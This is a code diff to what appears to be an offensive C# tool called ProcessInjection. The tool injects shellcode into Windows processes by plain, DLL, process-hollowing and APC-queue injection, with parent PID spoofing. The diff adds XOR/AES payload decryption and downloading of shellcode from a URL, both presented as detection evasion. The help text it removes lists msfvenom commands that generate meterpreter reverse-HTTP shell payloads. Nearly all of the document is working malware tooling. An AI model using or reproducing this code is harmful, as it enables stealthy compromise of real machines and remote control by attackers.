@@ -6,6 +6,9 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Diagnostics;
 using System.Threading;
+using System.IO;
+using System.Security.Cryptography;
+using System.Net;
 
 namespace ProcessInjection
 {
@@ -298,32 +301,32 @@ namespace ProcessInjection
             {
                 uint lpNumberOfBytesWritten = 0;
                 uint lpThreadId = 0;
-                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
+                PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
                 IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
-                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
-                Console.WriteLine($"[+] Allocating memory to inject the shellcode.");
+                PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");
+                PrintInfo($"[!] Allocating memory to inject the shellcode.");
                 IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
-                Console.WriteLine($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
-                Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
+                PrintInfo($"[!] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
+                PrintInfo($"[!] Writing the shellcode at the allocated memory location.");
                 if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                 {
-                    Console.WriteLine($"[+] Shellcode written in the process memory.");
-                    Console.WriteLine($"[+] Creating remote thread to execute the shellcode.");
+                    PrintInfo($"[!] Shellcode written in the process memory.");
+                    PrintInfo($"[!] Creating remote thread to execute the shellcode.");
                     IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);
                     bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
-                    Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
+                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                 }
                 else
                 {
-                    Console.WriteLine($"[+] Failed to write the shellcode into the memory of the process id {pid}.");
+                    PrintError($"[-] Failed to write the shellcode into the memory of the process id {pid}.");
                 }
                 //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                 bool hOpenProcessClose = CloseHandle(pHandle);
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
-                Console.WriteLine(ex.Message);
+                PrintError("[-] " + Marshal.GetExceptionCode());
+                PrintError(ex.Message);
             }
         }
 
@@ -334,34 +337,34 @@ namespace ProcessInjection
             {
                 uint lpNumberOfBytesWritten = 0;
                 uint lpThreadId = 0;
-                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
+                PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
                 IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
-                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
+                PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");
                 IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
-                Console.WriteLine($"[+] {loadLibraryAddr} is the address of the LoadLibraryA exported function.");
-                Console.WriteLine($"[+] Allocating memory for the DLL path.");
+                PrintInfo($"[!] {loadLibraryAddr} is the address of the LoadLibraryA exported function.");
+                PrintInfo($"[!] Allocating memory for the DLL path.");
                 IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
-                Console.WriteLine($"[+] Memory for injecting DLL path is allocated at 0x{rMemAddress}.");
-                Console.WriteLine($"[+] Writing the DLL path at the allocated memory location.");
+                PrintInfo($"[!] Memory for injecting DLL path is allocated at 0x{rMemAddress}.");
+                PrintInfo($"[!] Writing the DLL path at the allocated memory location.");
                 if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                 {
-                    Console.WriteLine($"[+] DLL path written in the target process memory.");
-                    Console.WriteLine($"[+] Creating remote thread to execute the DLL.");
+                    PrintInfo($"[!] DLL path written in the target process memory.");
+                    PrintInfo($"[!] Creating remote thread to execute the DLL.");
                     IntPtr hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, loadLibraryAddr, rMemAddress, 0, ref lpThreadId);
                     bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
-                    Console.WriteLine($"[+] Sucessfully injected the DLL into the memory of the process id {pid}.");
+                    PrintSuccess($"[+] Sucessfully injected the DLL into the memory of the process id {pid}.");
                 }
                 else
                 {
-                    Console.WriteLine($"[+] Failed to write the DLL into the memory of the process id {pid}.");
+                    PrintError($"[-] Failed to write the DLL into the memory of the process id {pid}.");
                 }
                 //WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
                 bool hOpenProcessClose = CloseHandle(pHandle);
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
-                Console.WriteLine(ex.Message);
+                PrintError("[-] " + Marshal.GetExceptionCode());
+                PrintError(ex.Message);
             }
         }
 
@@ -425,7 +428,7 @@ namespace ProcessInjection
                 PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
                 CreateProcess((IntPtr)0, binaryPath, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
 
-                Console.WriteLine($"[+] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");
+                PrintInfo($"[!] Process {binaryPath} started with Process ID: {procInfo.dwProcessId}.");
 
                 return procInfo;
             }
@@ -441,7 +444,7 @@ namespace ProcessInjection
                 liVal.LowPart = size_;
 
                 long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);
-                Console.WriteLine($"[+] Executable section created.");
+                PrintInfo($"[!] Executable section created.");
                 return nt_success(status);
             }
 
@@ -458,7 +461,7 @@ namespace ProcessInjection
             {
 
                 KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
-                Console.WriteLine($"[+] Map view section to the current process: {vals}.");
+                PrintInfo($"[!] Map view section to the current process: {vals}.");
                 localmap_ = vals.Key;
                 localsize_ = vals.Value;
 
@@ -467,7 +470,7 @@ namespace ProcessInjection
             public void CopyShellcode(byte[] buf)
             {
                 long lsize = size_;
-                Console.WriteLine($"[+] Copying Shellcode into section: {lsize}. ");
+                PrintInfo($"[!] Copying Shellcode into section: {lsize}. ");
 
                 unsafe
                 {
@@ -486,7 +489,7 @@ namespace ProcessInjection
                 IntPtr ptr;
 
                 ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
-                Console.WriteLine($"[+] Preparing shellcode patch for the new process entry point: {ptr}. ");
+                PrintInfo($"[!] Preparing shellcode patch for the new process entry point: {ptr}. ");
 
                 unsafe
                 {
@@ -526,7 +529,7 @@ namespace ProcessInjection
 
             private IntPtr GetEntryFromBuffer(byte[] buf)
             {
-                Console.WriteLine($"[+] Locating the entry point for the main module in remote process.");
+                PrintInfo($"[!] Locating the entry point for the main module in remote process.");
                 IntPtr res = IntPtr.Zero;
                 unsafe
                 {
@@ -564,7 +567,7 @@ namespace ProcessInjection
                 uint tmp = 0;
 
                 long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
-                Console.WriteLine($"[+] Locating the module base address in the remote process.");
+                PrintInfo($"[!] Locating the module base address in the remote process.");
 
                 IntPtr readLoc = IntPtr.Zero;
                 byte[] addrBuf = new byte[IntPtr.Size];
@@ -589,7 +592,7 @@ namespace ProcessInjection
                 pModBase_ = readLoc;
 
                 ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead);
-                Console.WriteLine($"[+] Read the first page and locate the entry point: {readLoc}.");
+                PrintInfo($"[!] Read the first page and locate the entry point: {readLoc}.");
 
                 return GetEntryFromBuffer(inner_);
             }
@@ -598,7 +601,7 @@ namespace ProcessInjection
             {
 
                 KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
-                Console.WriteLine($"[+] Locate shellcode into the suspended remote porcess: {tmp}.");
+                PrintInfo($"[!] Locate shellcode into the suspended remote porcess: {tmp}.");
 
                 remotemap_ = tmp.Key;
                 remotesize_ = tmp.Value;
@@ -625,7 +628,7 @@ namespace ProcessInjection
                 ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead);
 
                 uint res = ResumeThread(pInfo.hThread);
-                Console.WriteLine($"[+] Process has been resumed.");
+                PrintSuccess($"[+] Process has been resumed.");
 
             }
 
@@ -667,7 +670,7 @@ namespace ProcessInjection
         public class ParentPidSpoofing
         {
             // https://stackoverflow.com/questions/10554913/how-to-call-createprocess-with-startupinfoex-from-c-sharp-and-re-parent-the-ch
-            
+
             public int SearchForPPID(string process)
             {
                 int pid = 0;
@@ -676,19 +679,19 @@ namespace ProcessInjection
 
                 try
                 {
-                    foreach(Process proc in allprocess)
+                    foreach (Process proc in allprocess)
                     {
                         if (proc.SessionId == session)
                         {
                             pid = proc.Id;
-                            Console.WriteLine($"[+] Parent process ID found: {pid}.");
+                            PrintInfo($"[!] Parent process ID found: {pid}.");
                         }
                     }
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("[+] " + Marshal.GetExceptionCode());
-                    Console.WriteLine(ex.Message);
+                    PrintError("[-] " + Marshal.GetExceptionCode());
+                    PrintError(ex.Message);
                 }
                 return pid;
             }
@@ -716,13 +719,13 @@ namespace ProcessInjection
                 InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, ref lpSize);
 
                 IntPtr parentHandle = OpenProcess((uint)ProcessAccessRights.CreateProcess | (uint)ProcessAccessRights.DuplicateHandle, false, (uint)parentID);
-                Console.WriteLine($"[+] Handle {parentHandle} opened for parent process id.");
+                PrintInfo($"[!] Handle {parentHandle} opened for parent process id.");
 
                 lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                 Marshal.WriteIntPtr(lpValueProc, parentHandle);
 
                 UpdateProcThreadAttribute(siEx.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
-                Console.WriteLine($"[+] Adding attributes to a list.");
+                PrintInfo($"[!] Adding attributes to a list.");
 
                 siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                 siEx.StartupInfo.wShowWindow = SW_HIDE;
@@ -732,20 +735,20 @@ namespace ProcessInjection
                 ps.nLength = Marshal.SizeOf(ps);
                 ts.nLength = Marshal.SizeOf(ts);
 
-               try
+                try
                 {
                     bool ProcCreate = CreateProcess(childPath, null, ref ps, ref ts, true, CreateSuspended | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
                     if (!ProcCreate)
                     {
-                        Console.WriteLine($"[+] Proccess failed to execute!");
+                        PrintError($"[-] Proccess failed to execute!");
 
                     }
-                    Console.WriteLine($"[+] New process with ID: {pInfo.dwProcessId} created in a suspended state under the defined parent process.");
+                    PrintInfo($"[!] New process with ID: {pInfo.dwProcessId} created in a suspended state under the defined parent process.");
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("[+] " + Marshal.GetExceptionCode());
-                    Console.WriteLine(ex.Message);
+                    PrintError("[-] " + Marshal.GetExceptionCode());
+                    PrintError(ex.Message);
                 }
                 return pInfo;
             }
@@ -783,33 +786,33 @@ namespace ProcessInjection
             try
             {
                 uint lpNumberOfBytesWritten = 0;
-                Console.WriteLine($"[+] Obtaining the handle for the process id {pid}.");
+                PrintInfo($"[!] Obtaining the handle for the process id {pid}.");
                 IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
-                Console.WriteLine($"[+] Handle {pHandle} opened for the process id {pid}.");
-                Console.WriteLine($"[+] Allocating memory to inject the shellcode.");
+                PrintInfo($"[!] Handle {pHandle} opened for the process id {pid}.");
+                PrintInfo($"[!] Allocating memory to inject the shellcode.");
                 IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
-                Console.WriteLine($"[+] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
-                Console.WriteLine($"[+] Writing the shellcode at the allocated memory location.");
+                PrintInfo($"[!] Memory for injecting shellcode allocated at 0x{rMemAddress}.");
+                PrintInfo($"[!] Writing the shellcode at the allocated memory location.");
                 if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
                 {
-                    Console.WriteLine($"[+] Shellcode written in the process memory.");
+                    PrintInfo($"[!] Shellcode written in the process memory.");
                     IntPtr tHandle = OpenThread(ThreadAccess.THREAD_ALL, false, (uint)threadid);
-                    Console.WriteLine($"[+] Add the thread {tHandle} to queue for execution when it enters an alertable state.");
+                    PrintInfo($"[!] Add the thread {tHandle} to queue for execution when it enters an alertable state.");
                     IntPtr ptr = QueueUserAPC(rMemAddress, tHandle, IntPtr.Zero);
-                    Console.WriteLine($"[+] Resume the thread {tHandle}");
+                    PrintInfo($"[!] Resume the thread {tHandle}");
                     ResumeThread(tHandle);
-                    Console.WriteLine($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
+                    PrintSuccess($"[+] Sucessfully injected the shellcode into the memory of the process id {pid}.");
                 }
                 else
                 {
-                    Console.WriteLine($"[+] Failed to write the shellcode into the memory of the process id {pid}.");
+                    PrintError($"[-] Failed to write the shellcode into the memory of the process id {pid}.");
                 }
                 bool hOpenProcessClose = CloseHandle(pHandle);
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[+] " + Marshal.GetExceptionCode());
-                Console.WriteLine(ex.Message);
+                PrintError("[-] " + Marshal.GetExceptionCode());
+                PrintError(ex.Message);
             }
         }
 
@@ -818,6 +821,106 @@ namespace ProcessInjection
             ParentPidSpoofing Parent = new ParentPidSpoofing();
             PROCESS_INFORMATION pinf = Parent.ParentSpoofing(parentpid, binary);
             APCInject(pinf.dwProcessId, pinf.dwThreadId, shellcode);
+        }
+
+        //https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab4/1.cs#L10
+        private static byte[] xor(byte[] cipher, byte[] key)
+        {
+
+            byte[] xored = new byte[cipher.Length];
+
+            for (int i = 0; i < cipher.Length; i++)
+            {
+                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
+            }
+
+            return xored;
+        }
+
+        // https://github.com/mvelazc0/defcon27_csharp_workshop/blob/master/Labs/lab4/3.cs#L95
+        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
+        {
+            byte[] decryptedBytes = null;
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+            using (MemoryStream ms = new MemoryStream())
+            {
+                using (RijndaelManaged AES = new RijndaelManaged())
+                {
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                    AES.Mode = CipherMode.CBC;
+
+                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
+                        cs.Close();
+                    }
+                    decryptedBytes = ms.ToArray();
+                }
+            }
+
+            return decryptedBytes;
+        }
+
+        public static string ByteArrayToString(byte[] ba)
+        {
+            StringBuilder hex = new StringBuilder(ba.Length * 2);
+            foreach (byte b in ba)
+                hex.AppendFormat("{0:x2}", b);
+            return hex.ToString();
+        }
+
+        public static byte[] GetRawShellcode(string url)
+        {
+            WebClient client = new WebClient();
+            client.Proxy = WebRequest.GetSystemWebProxy();
+            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
+            byte[] shellcode = client.DownloadData(url);
+
+            return shellcode;
+        }
+
+        public static string GetShellcode(string url)
+        {
+            WebClient client = new WebClient();
+            client.Proxy = WebRequest.GetSystemWebProxy();
+            client.Proxy.Credentials = CredentialCache.DefaultCredentials;
+            string shellcode = client.DownloadString(url);
+
+            return shellcode;
+        }
+
+        public static void PrintError(string error)
+        {
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine(error);
+            Console.ResetColor();
+        }
+
+        public static void PrintSuccess(string success)
+        {
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.WriteLine(success);
+            Console.ResetColor();
+        }
+        public static void PrintInfo(string info)
+        {
+            Console.ForegroundColor = ConsoleColor.Blue;
+            Console.WriteLine(info);
+            Console.ResetColor();
+        }
+
+        public static void PrintTitle(string title)
+        {
+            Console.ForegroundColor = ConsoleColor.Gray;
+            Console.WriteLine(title);
+            Console.ResetColor();
         }
 
         public static void logo()
@@ -842,68 +945,46 @@ namespace ProcessInjection
 *****************Help*****************
 [+] The program is designed to perform process injection.
 [+] Currently the tool supports 4 process injection techniques.
-    1) Vanila Process Injection
+    1) Vanilla Process Injection
     2) DLL Injection
     3) Process Hollowing
-    4) APC Queue
+    4) APC Queue Injection
 
-[+] Vanila Process Injection
-[+] Currently the tool accepts shellcode in 3 formats.
+[+] Supports 3 detection evading techniques.
+    1) Parent PID Spoofing
+    
+    Encryption
+    2) XOR Encryption (It can also be used with Parent PID Spoofing technique but can't be used with DLL Injection Technique)
+    3) AES Encryption (It can also be used with Parent PID Spoofing technique but can't be used with DLL Injection Technique)
+
+[+] The tool accepts shellcode in 4 formats.
     1) base64
     2) hex
-    3) C
+    3) c
+    4) raw
 
-[+] Supports 1 detection evading technique.
-    1) Parent PID Spoofing
 
-[+] Generating shellcode in base64 format and injecting it in the target process.
-[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" | base64
-[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:base64 /t:1
+Usage           Description
+-----           -----------
+/t              Specify the process injection technique id.
+                1 = Vanilla Process Injection
+                2 = DLL Injection
+                3 = Process Hollowing
+                4 = APC Queue Injection
+/f              Specify the format of the shellcode
+                base64
+                hex
+                c
+                raw
+/pid            Specify the process id
+/parentproc     Specify the parent process name
+/path           Specify the path of the file that contains the shellcode
+/ppath          Specify the path of the executable that will be spawned (Mandatory while using /parentproc argument)
+/url            Specify the url where the shellcode is hosted
+/enc            Specify the encryption type (aes or xor) in which the shellcode is encrypted
+/key            Specify the key that will be used to decrypt the shellcode.
+/help           Show help
 
-[+] Generating shellcode in hex format and injecting it in the target process.
-[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f hex
-[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:hex /t:1
-
-[+] Generating shellcode in c format and injecting it in the target process.
-[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f c
-[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:1
-
-[+] DLL Injection
-[+] Generating DLL and injecting it in the target process.
-[+] msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -b ""\x00"" -f dll > Desktop/calc.dll
-[+] ProcessInjection.exe /pid:123 /path:""C:\Users\User\Desktop\calc.dll"" /t:2
-
-[+] Process Hollowing
-[+] Generating shellcode in c format and injecting it in the target process.
-[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3
-
-[+] APC Queue
-[+] Generating shellcode in c format and injecting it in the target process.
-[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:7
-
-[+] Detection Evading Technique
-
-[+] Parent PID Spoofing with Vanila Process Injection.
-[+] Generating shellcode in c format and injecting it in the target process.
-[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:4
-
-[+] Parent PID Spoofing with DLL Injection.
-[+] Generating DLL and injecting it in the target process.
-[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f dll > Desktop/reverse_shell.dll
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\reverse_shell.dll"" /parentproc:explorer /t:5
-
-[+] Parent PID Spoofing with Process Hollowing.
-[+] Generating shellcode in c format and injecting it in the target process.
-[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:6
-
-[+] Parent PID Spoofing with APC Queue.
-[+] Generating shellcode in c format and injecting it in the target process.
-[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:8
 ";
             Console.WriteLine(help);
         }
@@ -928,38 +1009,126 @@ namespace ProcessInjection
                 WindowsPrincipal principal = new WindowsPrincipal(identity);
                 if (principal.IsInRole(WindowsBuiltInRole.Administrator))
                 {
-                    Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with HIGH integrity.");
+                    PrintInfo($"[!] Process running with {principal.Identity.Name} privileges with HIGH integrity.");
                 }
                 else
                 {
-                    Console.WriteLine($"[+] Process running with {principal.Identity.Name} privileges with MEDIUM / LOW integrity.");
+                    PrintInfo($"[!] Process running with {principal.Identity.Name} privileges with MEDIUM / LOW integrity.");
                 }
 
                 if (arguments.Count == 0)
                 {
-                    Console.WriteLine("[+] No arguments specified. Please refer the help section for more details.");
+                    PrintError("[-] No arguments specified. Please refer the help section for more details.");
+                    help();
+                }
+                else if (arguments.ContainsKey("/help"))
+                {
                     help();
                 }
                 else if (arguments.Count < 3)
                 {
-                    Console.WriteLine("[+] Some arguments are missing. Please refer the help section for more details.");
+                    PrintError("[-] Some arguments are missing. Please refer the help section for more details.");
                     help();
                 }
                 else if (arguments.Count >= 3)
                 {
                     int procid = 0;
+                    ParentPidSpoofing Parent = new ParentPidSpoofing();
+                    string ppid = null;
+                    int parentProc = 0;
+                    string shellcode = null;
+                    byte[] rawshellcode = new byte[] { };
+
                     if (arguments.ContainsKey("/pid"))
                     {
                         procid = Convert.ToInt32(arguments["/pid"]);
                         Process process = Process.GetProcessById(procid);
                     }
-                    if (System.IO.File.Exists(arguments["/path"]))
+                    if (arguments.ContainsKey("/parentproc"))
                     {
-                        if (arguments["/t"] == "1")
+                        ppid = Convert.ToString(arguments["/parentproc"]);
+                        parentProc = Parent.SearchForPPID(ppid);
+                    }
+                    if (arguments.ContainsKey("/path") && System.IO.File.Exists(arguments["/path"]))
+                    {
+                        if (arguments["/f"] == "raw")
                         {
-                            Console.WriteLine($"[+] Vanila Process Injection Technique.");
-                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
-                            byte[] buf = new byte[] { };
+                            rawshellcode = System.IO.File.ReadAllBytes(arguments["/path"]);
+                        }
+                        else
+                        {
+                            shellcode = System.IO.File.ReadAllText(arguments["/path"]);
+                        }
+
+                    }
+                    else if (arguments.ContainsKey("/url"))
+                    {
+                        if (arguments["/f"] == "raw")
+                        {
+                            rawshellcode = GetRawShellcode(arguments["/url"]);
+                        }
+                        else
+                        {
+                            shellcode = GetShellcode(arguments["/url"]);
+                        }
+
+                    }
+
+                    if (shellcode != null || rawshellcode.Length > 0)
+                    {
+
+                        byte[] xorshellcode = new byte[] { };
+                        byte[] aesshellcode = new byte[] { };
+                        byte[] buf = new byte[] { };
+
+                        if (arguments.ContainsKey("/enc") == true && arguments["/enc"] == "xor")
+                        {
+                            if (arguments["/f"] == "base64")
+                            {
+                                xorshellcode = Convert.FromBase64String(shellcode);
+                                buf = xor(xorshellcode, Encoding.ASCII.GetBytes(arguments["/key"]));
+                            }
+                            else if (arguments["/f"] == "hex")
+                            {
+                                xorshellcode = StringToByteArray(shellcode);
+                                buf = xor(xorshellcode, Encoding.ASCII.GetBytes(arguments["/key"]));
+                            }
+                            else if (arguments["/f"] == "c")
+                            {
+                                xorshellcode = convertfromc(shellcode);
+                                buf = xor(xorshellcode, Encoding.ASCII.GetBytes(arguments["/key"]));
+                            }
+                            else if (arguments["/f"] == "raw")
+                            {
+                                buf = xor(rawshellcode, Encoding.ASCII.GetBytes(arguments["/key"]));
+                            }
+                        }
+                        else if (arguments.ContainsKey("/enc") == true && arguments["/enc"] == "aes")
+                        {
+                            byte[] passwordBytes = Encoding.UTF8.GetBytes(arguments["/key"]);
+                            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+                            if (arguments["/f"] == "base64")
+                            {
+                                aesshellcode = Convert.FromBase64String(shellcode);
+                                buf = AES_Decrypt(aesshellcode, passwordBytes);
+                            }
+                            else if (arguments["/f"] == "hex")
+                            {
+                                aesshellcode = StringToByteArray(shellcode);
+                                buf = AES_Decrypt(aesshellcode, passwordBytes);
+                            }
+                            else if (arguments["/f"] == "c")
+                            {
+                                aesshellcode = convertfromc(shellcode);
+                                buf = AES_Decrypt(aesshellcode, passwordBytes);
+                            }
+                            else if (arguments["/f"] == "raw")
+                            {
+                                buf = AES_Decrypt(rawshellcode, passwordBytes);
+                            }
+                        }
+                        else
+                        {
                             if (arguments["/f"] == "base64")
                             {
                                 buf = Convert.FromBase64String(shellcode);
@@ -972,155 +1141,111 @@ namespace ProcessInjection
                             {
                                 buf = convertfromc(shellcode);
                             }
-                            CodeInject(procid, buf);
+                            else if (arguments["/f"] == "raw")
+                            {
+                                buf = rawshellcode;
+                            }
+                        }
+
+                        if (arguments["/t"] == "1")
+                        {
+                            if (arguments.ContainsKey("/parentproc"))
+                            {
+                                if (arguments.ContainsKey("/ppath"))
+                                {
+                                    PrintTitle($"[>>] Parent Process Spoofing with Vanilla Process Injection Technique.");
+                                    PPIDCodeInject(arguments["/ppath"], buf, parentProc);
+                                }
+                                else
+                                {
+                                    PrintError("[-] /ppath argument is missing");
+                                }
+                            }
+                            else
+                            {
+                                PrintTitle($"[>>] Vanilla Process Injection Technique.");
+                                CodeInject(procid, buf);
+                            }
                         }
                         else if (arguments["/t"] == "2")
                         {
-                            Console.WriteLine($"[+] DLL Injection Technique.");
-                            var dllpath = arguments["/path"];
-                            byte[] buf = Encoding.Default.GetBytes(dllpath);
-                            DLLInject(procid, buf);
+                            if (arguments.ContainsKey("/parentproc"))
+                            {
+                                if (arguments.ContainsKey("/ppath"))
+                                {
+                                    PrintTitle($"[>>] Parent Process Spoofing with DLL Injection Technique.");
+                                    byte[] dllbuf = Encoding.Default.GetBytes(arguments["/path"]);
+                                    PPIDDLLInject(arguments["/ppath"], dllbuf, parentProc);
+                                }
+                                else
+                                {
+                                    PrintError("[-] /ppath argument is missing");
+                                }
+                            }
+                            else
+                            {
+                                PrintTitle($"[>>] DLL Injection Technique.");
+                                byte[] dllbuf = Encoding.Default.GetBytes(arguments["/path"]);
+                                DLLInject(procid, dllbuf);
+                            }
                         }
                         else if (arguments["/t"] == "3")
                         {
-                            Console.WriteLine($"[+] Process Hollowing Injection Technique.");
-                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
-                            byte[] buf = new byte[] { };
-                            if (arguments["/f"] == "base64")
+                            if (arguments.ContainsKey("/ppath"))
                             {
-                                buf = Convert.FromBase64String(shellcode);
+                                if (arguments.ContainsKey("/parentproc"))
+                                {
+                                    PrintTitle($"[>>] Parent Process Spoofing with Process Hollowing Technique.");
+                                    Parent.PPidSpoof(arguments["/ppath"], buf, parentProc);
+                                }
+                                else
+                                {
+                                    PrintTitle($"[>>] Process Hollowing Injection Technique.");
+                                    ProcHollowing prochollow = new ProcHollowing();
+                                    prochollow.Hollow(arguments["/ppath"], buf);
+                                }
                             }
-                            else if (arguments["/f"] == "hex")
+                            else
                             {
-                                buf = StringToByteArray(shellcode);
+                                PrintError("[-] /ppath argument is missing");
                             }
-                            else if (arguments["/f"] == "c")
-                            {
-                                buf = convertfromc(shellcode);
-                            }
-                            ProcHollowing prochollow = new ProcHollowing();
-                            prochollow.Hollow(arguments["/ppath"], buf);
                         }
-                        else if (arguments["/t"]  == "4")
+                        else if (arguments["/t"] == "4")
                         {
-                            Console.WriteLine($"[+] Parent Process Spoofing with Vanila Process Injection Technique.");
-                            ParentPidSpoofing Parent = new ParentPidSpoofing();
-                            string ppid = null;
-                            int parentProc = 0;
-                            ppid = Convert.ToString(arguments["/parentproc"]);
-                            parentProc = Parent.SearchForPPID(ppid);
